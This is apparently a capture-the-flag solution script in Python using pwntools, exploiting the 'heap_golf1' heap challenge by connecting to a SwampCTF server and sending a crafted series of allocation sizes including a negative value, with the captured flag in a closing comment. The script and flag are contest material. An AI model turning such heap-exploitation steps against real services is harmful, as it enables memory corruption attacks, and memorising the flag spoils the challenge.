#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'
local = 0
if local:
	p = process('./heap_golf1')
else:
	p = remote('chal1.swampctf.com', 1066)

def send(size):
	p.recvuntil('Size of green to provision:')
	p.sendline(str(size))

send(0x30)
send(0x40)
send(0x50)
send(0x20)
send(-2)
send(0x30)
send(0x40)
send(0x50)
send(0x20)
print p.recv()
p.interactive()
# flag{Gr34t_J0b_t0ur1ng_0ur_d1gi7al_L1nk5}
